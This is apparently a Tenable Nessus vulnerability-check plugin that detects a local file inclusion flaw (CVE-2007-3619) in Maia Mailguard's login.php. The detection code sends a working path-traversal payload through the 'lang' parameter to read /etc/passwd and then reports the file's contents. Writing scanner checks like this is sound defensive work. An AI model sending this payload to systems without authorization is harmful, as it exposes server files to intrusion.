#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(25673);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-3619");
  script_bugtraq_id(24770);
  script_xref(name:"OSVDB", value:"37884");

  script_name(english:"Maia Mailguard login.php lang Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with Maia Mailguard");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Maia Mailguard, a spam and virus management
system written in PHP. 

The version of Maia Mailguard installed on the remote host fails to
sanitize user input to the 'lang' parameter before using it to include
PHP code in 'login.php'.  Regardless of PHP's 'register_globals'
setting, an unauthenticated remote attacker may be able to exploit
this issue to view arbitrary files or to execute arbitrary PHP code on
the remote host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-07/0041.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.maiamailguard.org/maia/ticket/479" );
 script_set_attribute(attribute:"see_also", value:"http://www.maiamailguard.org/maia/changeset/1184" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from Changeset 1184." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mailguard", "/maia", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/../../../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/login.php?",
      "lang=", file, ".txt"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    egrep(pattern:"main\(\): Failed opening required .+/etc/passwd\\0\.txt", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(\): Failed opening required .+/etc/passwd' ", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");
    else contents = "";

    if (contents)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
